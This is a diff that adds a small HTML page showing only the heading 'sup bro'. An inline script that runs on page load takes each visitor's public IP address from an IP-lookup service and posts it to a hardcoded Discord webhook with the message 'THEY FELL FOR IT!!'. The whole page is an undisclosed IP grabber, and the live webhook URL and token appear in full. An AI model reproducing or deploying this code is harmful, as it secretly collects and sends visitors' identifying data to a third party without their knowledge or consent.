@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sup bro</title>
+
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+
+        h1 {
+            font-size: 64px;
+            color: black;
+            margin: 0;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>sup bro</h1>
+
+    <script>
+
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ip = data.ip;
+    const webhookUrl = 'https://discord.com/api/webhooks/1551747793201274920/X7MMK3E83Am1VbaopT_buCPFp7ByRh8jo8cr0pwqekaRZXzFHJtJ2PyWVg6FQ5d4QdXC';
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: `@here YOYOYO!! THEY FELL FOR IT!!: ${ip}` })
+    });
+  });
+
+    </script>
+
+</body>
+</html>
